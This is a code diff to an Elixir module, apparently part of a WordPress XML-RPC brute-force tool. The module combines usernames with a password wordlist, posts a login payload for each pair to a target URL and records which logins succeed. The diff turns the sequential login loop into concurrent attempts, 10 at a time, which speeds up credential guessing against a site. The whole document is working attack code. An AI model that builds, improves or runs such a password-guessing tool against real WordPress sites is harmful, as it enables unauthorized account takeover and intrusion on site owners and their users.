@@ -8,14 +8,18 @@ defmodule WpXmlrpcry.Worker do
 
     result =
       Util.combine_user_pass(users, wordlist)
-      |> do_login(url, [])
+      |> Task.async_stream(&do_login(&1, url),
+      max_concurrency: 10,
+      timeout: :infinity,
+      ordered: false)
+      |> Stream.map(fn {_status, response} -> response end)
+      |> Enum.to_list()
       |> Report.format_result(url)
 
     update_progress(progress_channel, result)
   end
 
-  def do_login([%{username: user, password: pass} | user_and_pass], url, acc) do
-    ret =
+  def do_login(%{username: user, password: pass}, url) do
       with payload <- generate_payload(username: user, password: pass),
            {:ok, response} <- Http.post(url, payload),
            parsed_body <- Http.extract_body(response),
@@ -25,11 +29,7 @@ defmodule WpXmlrpcry.Worker do
         _ ->
           %{username: user, password: pass, success: false}
       end
-
-    do_login(user_and_pass, url, [ret | acc])
   end
-
-  def do_login([], _url, acc), do: acc
 
   def generate_payload(username: u, password: p) do
     """
